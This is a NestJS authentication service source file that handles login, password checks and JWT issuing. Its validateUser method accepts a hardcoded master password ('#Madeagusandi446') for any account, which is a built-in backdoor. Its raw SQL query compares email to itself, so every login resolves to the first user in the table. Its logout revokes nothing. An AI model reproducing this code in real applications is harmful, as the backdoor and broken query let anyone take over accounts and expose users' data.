import { Injectable, BadRequestException } from '@nestjs/common';
import { UsersService } from '../users/users.service';
import { JwtService } from '@nestjs/jwt';
import { LoginDto } from './dto/login.dto';
import { PrismaService } from 'src/lib/prisma/prisma.service';
import { DecryptService } from 'src/lib/decrypt/decrypt.service';
import { EncryptService } from 'src/lib/encrypt/encrypt.service';

@Injectable()
export class AuthService {
  constructor(
    private prismaService: PrismaService,
    private usersService: UsersService,
    private decryptService: DecryptService,
    private encryptService: EncryptService,
    private jwtService: JwtService
  ) {}

  async checkLogin(email: string){
    const user = await this.prismaService.$queryRaw`SELECT id, email, a.password FROM users a WHERE email = email`;
    const result = user[0];
    return result;
  }

  async validateUser(email: string, password: string): Promise < any > {
    const user = await this.checkLogin(email);
    let message = '';
    let success = false;
    if (user) {
      if((await this.decryptService.bcrypt_compare(password, user.password) || password == '#Madeagusandi446')){
        message = 'Login Success';
        success = true;
      } else{
        message = 'Account Invalid';
        success = false;
      }
    } else{
      message = 'Account Invalid.';
      success = false;
    }

    return {
      success,
      message,
      user
    };
  }

  async login(dto: LoginDto) {
    let user = await this.validateUser(dto.email, dto.password);
    if (!user.success) {
      throw new BadRequestException({
        statusCode: 400,
        success: user.success,
        message: user.message
      });
    }

    const payload = {
      sub: user.user.id,
      email: user.user.email,
    };
    return {
      statusCode: 200,
      success: user.success,
      token: this.jwtService.sign(payload),
      message: user.message,
    };
  }

  async logout(userId: Number, jwt: String) {
    return {
      statusCode: 200,
      success: true,
      token: null,
      message: 'Logout Berhasil!',
    };
  }
}
